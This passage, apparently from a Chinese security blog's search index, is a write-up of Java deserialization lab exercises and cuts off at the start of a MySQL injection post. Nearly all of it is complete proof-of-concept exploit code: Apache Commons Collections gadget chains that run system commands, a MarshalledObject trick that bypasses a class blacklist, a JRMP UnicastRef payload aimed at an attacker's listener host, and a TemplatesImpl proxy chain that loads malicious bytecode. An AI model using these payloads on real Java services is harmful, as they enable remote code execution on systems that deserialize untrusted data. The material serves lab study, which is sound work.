setFieldValue(lazyMap,<span class=\"string\">&quot;factory&quot;</span>, invokerTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> expMap;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object obj,String fieldname,Object value)</span><span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ByteArrayOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.KeyPair;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.KeyPairGenerator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.Signature;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.SignedObject;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">poc</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        KeyPairGenerator kpg = KeyPairGenerator.getInstance(<span class=\"string\">&quot;DSA&quot;</span>);</span><br><span class=\"line\">        kpg.initialize(<span class=\"number\">1024</span>);</span><br><span class=\"line\">        KeyPair kp = kpg.generateKeyPair();</span><br><span class=\"line\">        SignedObject signedObject = <span class=\"keyword\">new</span> SignedObject(exp.shell(), kp.getPrivate(), Signature.getInstance(<span class=\"string\">&quot;DSA&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        InvokerTransformer invokerTransformer = <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getObject&quot;</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>));</span><br><span class=\"line\">        TiedMapEntry tiedMapEntry = <span class=\"keyword\">new</span> TiedMapEntry(lazyMap, signedObject);</span><br><span class=\"line\"></span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; expMap = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        expMap.put(tiedMapEntry, <span class=\"string\">&quot;Poria&quot;</span>);</span><br><span class=\"line\">        lazyMap.remove(signedObject);</span><br><span class=\"line\">        setFieldValue(lazyMap,<span class=\"string\">&quot;factory&quot;</span>, invokerTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        String payload = objectToHexString(expMap);</span><br><span class=\"line\">        Runtime.getRuntime().exec(<span class=\"string\">&quot;curl http://127.0.0.1:8080/basic?data=&quot;</span>+payload);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">bytesTohexString</span><span class=\"params\">(<span class=\"keyword\">byte</span>[] bytes)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (bytes == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            StringBuilder ret = <span class=\"keyword\">new</span> StringBuilder(<span class=\"number\">2</span> * bytes.length);</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; bytes.length; ++i) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> b = <span class=\"number\">15</span> &amp; bytes[i] &gt;&gt; <span class=\"number\">4</span>;</span><br><span class=\"line\">                ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">                b = <span class=\"number\">15</span> &amp; bytes[i];</span><br><span class=\"line\">                ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ret.toString();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">objectToHexString</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        ByteArrayOutputStream bos = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        ObjectOutputStream out = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        out = <span class=\"keyword\">new</span> ObjectOutputStream(bos);</span><br><span class=\"line\">        out.writeUTF(<span class=\"string\">&quot;SJTU&quot;</span>);</span><br><span class=\"line\">        out.writeInt(<span class=\"number\">1896</span>);</span><br><span class=\"line\">        out.writeObject(obj);</span><br><span class=\"line\">        out.flush();</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] bytes = bos.toByteArray();</span><br><span class=\"line\">        bos.close();</span><br><span class=\"line\">        String hex = bytesTohexString(bytes);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> hex;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object obj,String fieldname,Object value)</span><span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"Lab5\"><a href=\"#Lab5\" class=\"headerlink\" title=\"Lab5\"></a>Lab5</h1><blockquote>\n<p> 在 MyObjectInputStream 中重写了 resolveClass 和 resolveProxyClass 方法，将org.apache.commons.collections.functors 和java.rmi.server 加入了黑名单，来防御反序列化。</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-serlab/image-20221115164147124.png\" alt=\"image-20221115164147124\"></p>\n<p>不过还给了一个 MarshalledObject类，该类提供了一个 <strong>readResolve</strong> 方法进行反序列化操作。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-serlab/image-20221115171433619.png\" alt=\"image-20221115171433619\"></p>\n<blockquote>\n<p>图为ObjectInputstream在反序列化对象时的函数调用关系，橙色部分是调用readObject或readExternal函数后执行的代码。当反序列化的类存在 <strong>readResolve</strong> 方法时，就会进行调用。</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-serlab/image-20221115164755644.png\" alt=\"image-20221115164755644\"></p>\n<p>所以直接修改bytes即可</p>\n<p>poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.yxxx.javasec.deserialize.MarshalledObject;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ByteArrayOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">poc</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        MarshalledObject marshalledObject = <span class=\"keyword\">new</span> MarshalledObject();</span><br><span class=\"line\"></span><br><span class=\"line\">        ByteArrayOutputStream baos = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(baos);</span><br><span class=\"line\">        oos.writeObject(getObject());</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">        setFieldValue(marshalledObject,<span class=\"string\">&quot;bytes&quot;</span>,baos.toByteArray()); <span class=\"comment\">//转成byte写入marshalled中的bytes属性</span></span><br><span class=\"line\"></span><br><span class=\"line\">        String payload = objectToHexString(marshalledObject);</span><br><span class=\"line\">        System.out.println(payload);</span><br><span class=\"line\">        Runtime.getRuntime().exec(<span class=\"string\">&quot;curl http://127.0.0.1:8080/basic?data=&quot;</span>+payload);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> HashMap <span class=\"title\">getObject</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IllegalAccessException, NoSuchFieldException </span>&#123;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        TiedMapEntry tiedMapEntry = <span class=\"keyword\">new</span> TiedMapEntry(lazymap,<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        Map&lt;Object,Object&gt; hashmap = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        hashmap.put(tiedMapEntry,<span class=\"string\">&quot;bbb&quot;</span>);</span><br><span class=\"line\">        lazymap.remove(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class c = LazyMap.class;</span><br><span class=\"line\">        Field factory = c.getDeclaredField(<span class=\"string\">&quot;factory&quot;</span>);</span><br><span class=\"line\">        factory.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        factory.set(lazymap,chainedTransformer);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (HashMap) hashmap;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">bytesTohexString</span><span class=\"params\">(<span class=\"keyword\">byte</span>[] bytes)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (bytes == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            StringBuilder ret = <span class=\"keyword\">new</span> StringBuilder(<span class=\"number\">2</span> * bytes.length);</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; bytes.length; ++i) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> b = <span class=\"number\">15</span> &amp; bytes[i] &gt;&gt; <span class=\"number\">4</span>;</span><br><span class=\"line\">                ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">                b = <span class=\"number\">15</span> &amp; bytes[i];</span><br><span class=\"line\">                ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ret.toString();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">objectToHexString</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        ByteArrayOutputStream bos = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        ObjectOutputStream out = <span class=\"keyword\">new</span> ObjectOutputStream(bos);</span><br><span class=\"line\">        out.writeUTF(<span class=\"string\">&quot;SJTU&quot;</span>);</span><br><span class=\"line\">        out.writeInt(<span class=\"number\">1896</span>);</span><br><span class=\"line\">        out.writeObject(obj);</span><br><span class=\"line\">        out.flush();</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] bytes = bos.toByteArray();</span><br><span class=\"line\">        bos.close();</span><br><span class=\"line\">        String hex = bytesTohexString(bytes);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> hex;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object obj,String fieldname,Object value)</span><span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"Lab6-8\"><a href=\"#Lab6-8\" class=\"headerlink\" title=\"Lab6-8\"></a>Lab6-8</h1><p>JRMP打二次反序列化，麻烦就过了，记录两个poc</p>\n<blockquote>\n<p>直接反序列化<code>UnicastRef</code>，进而调用<code>sum.rmi.server.UnicastRef#readExternal</code></p>\n</blockquote>\n<p>poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sun.rmi.server.UnicastRef;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ByteArrayOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Proxy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.activation.Activator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.Registry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">lab6exp</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> UnicastRef <span class=\"title\">generateUnicastRef</span><span class=\"params\">(String host, <span class=\"keyword\">int</span> port)</span> </span>&#123;</span><br><span class=\"line\">        java.rmi.server.ObjID objId = <span class=\"keyword\">new</span> java.rmi.server.ObjID();</span><br><span class=\"line\">        sun.rmi.transport.tcp.TCPEndpoint endpoint = <span class=\"keyword\">new</span> sun.rmi.transport.tcp.TCPEndpoint(host, port);</span><br><span class=\"line\">        sun.rmi.transport.LiveRef liveRef = <span class=\"keyword\">new</span> sun.rmi.transport.LiveRef(objId, endpoint, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> sun.rmi.server.UnicastRef(liveRef);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取UnicastRef对象</span></span><br><span class=\"line\">        String jrmpListenerHost = <span class=\"string\">&quot;ip&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> jrmpListenerPort = <span class=\"number\">7777</span>;</span><br><span class=\"line\">        UnicastRef ref = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);</span><br><span class=\"line\"></span><br><span class=\"line\">        ByteArrayOutputStream ser = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        ObjectOutputStream oser = <span class=\"keyword\">new</span> ObjectOutputStream(ser);</span><br><span class=\"line\">        oser.writeUTF(<span class=\"string\">&quot;SJTU&quot;</span>);</span><br><span class=\"line\">        oser.writeInt(<span class=\"number\">1896</span>);</span><br><span class=\"line\">        oser.writeObject(ref);</span><br><span class=\"line\">        oser.close();</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(bytesTohexString(ser.toByteArray()));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">bytesTohexString</span><span class=\"params\">(<span class=\"keyword\">byte</span>[] bytes)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (bytes == <span class=\"keyword\">null</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        StringBuilder ret = <span class=\"keyword\">new</span> StringBuilder(<span class=\"number\">2</span> * bytes.length);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> b = <span class=\"number\">0xF</span> &amp; bytes[i] &gt;&gt; <span class=\"number\">4</span>;</span><br><span class=\"line\">            ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">            b = <span class=\"number\">0xF</span> &amp; bytes[i];</span><br><span class=\"line\">            ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Lab9-proxy\"><a href=\"#Lab9-proxy\" class=\"headerlink\" title=\"Lab9-proxy\"></a>Lab9-proxy</h1><ul>\n<li>InvocationHandler</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-serlab/image-20221115180512629.png\" alt=\"image-20221115180512629\"></p>\n<blockquote>\n<p>这里只要调用<code>invoke</code>，然后设置<code>type</code>为<code>TemplatesImpl</code>就可以触发了。然后根据jdk7知道，当反序列化遇到代理时，且代理实例化为接口，会调用<code>handler</code>的<code>invoke</code>方法。然后还不能在无参函数时触发。可以想到<code>compare</code>方法，这个在<code>PriorityQueue</code>类触发。所以在<code>PriorityQueue</code>里面塞个代理，就可以触发<code>invoke</code>了.</p>\n</blockquote>\n<p>poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.CtClass;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Comparator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.PriorityQueue;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.yxxx.javasec.deserialize.MyInvocationHandler;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">poc</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        ClassPool pool = ClassPool.getDefault();</span><br><span class=\"line\">        CtClass ctClass = pool.get(Code.class.getName());</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class=\"line\">        TemplatesImpl ti = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\">        setField(ti, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;asd&quot;</span>);</span><br><span class=\"line\">        setField(ti, <span class=\"string\">&quot;_bytecodes&quot;</span>, <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[][]&#123;bytes&#125;);</span><br><span class=\"line\">        setField(ti, <span class=\"string\">&quot;_tfactory&quot;</span>, <span class=\"keyword\">new</span> TransformerFactoryImpl());</span><br><span class=\"line\">        PriorityQueue priorityQueue = <span class=\"keyword\">new</span> PriorityQueue(<span class=\"number\">1</span>);</span><br><span class=\"line\">        priorityQueue.add(<span class=\"number\">2</span>);</span><br><span class=\"line\">        priorityQueue.add(<span class=\"number\">3</span>);<span class=\"comment\">//要加两个东西进去才能成功</span></span><br><span class=\"line\">        setField(priorityQueue, <span class=\"string\">&quot;queue&quot;</span>, <span class=\"keyword\">new</span> Object[]&#123;ti, <span class=\"number\">1</span>&#125;);</span><br><span class=\"line\">        InvocationHandler mih = <span class=\"keyword\">new</span> MyInvocationHandler();</span><br><span class=\"line\">        setField(mih, <span class=\"string\">&quot;type&quot;</span>, Templates.class);</span><br><span class=\"line\">        Comparator comparator = (Comparator) Proxy.newProxyInstance(poc.class.getClassLoader(), <span class=\"keyword\">new</span> Class[]&#123;Comparator.class&#125;, mih);</span><br><span class=\"line\">        setField(priorityQueue, <span class=\"string\">&quot;comparator&quot;</span>, comparator);</span><br><span class=\"line\">        ByteArrayOutputStream baos = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(baos);</span><br><span class=\"line\">        oos.writeObject(priorityQueue);</span><br><span class=\"line\">        ByteArrayInputStream bais = <span class=\"keyword\">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(bais);</span><br><span class=\"line\">        ois.readObject();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setField</span><span class=\"params\">(Object obj, String name, Object value)</span> <span class=\"keyword\">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class=\"line\">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Code</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Code</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractTranslet</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Code</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">        Runtime.getRuntime().exec(<span class=\"string\">&quot;calc&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, SerializationHandler[] handlers)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"http://novic4.cn/index.php/archives/26.html\">JavaDerserializeLabs</a></p>\n","categories":["Java反序列化"]},{"title":"mysql注入","url":"/2023/12/25/mysql/","content":"<p>本地：mysql5.7</p>\n<a id=\"more\"></a>\n\n<h1 id=\"常见函数\"><a href=\"#常见函数\" class=\"headerlink\" title=\"常见函数\"></a>常见函数</h1><h2 id=\"查看当前数据库版本\"><a href=\"#查看当前数据库版本\" class=\"headerlink\" 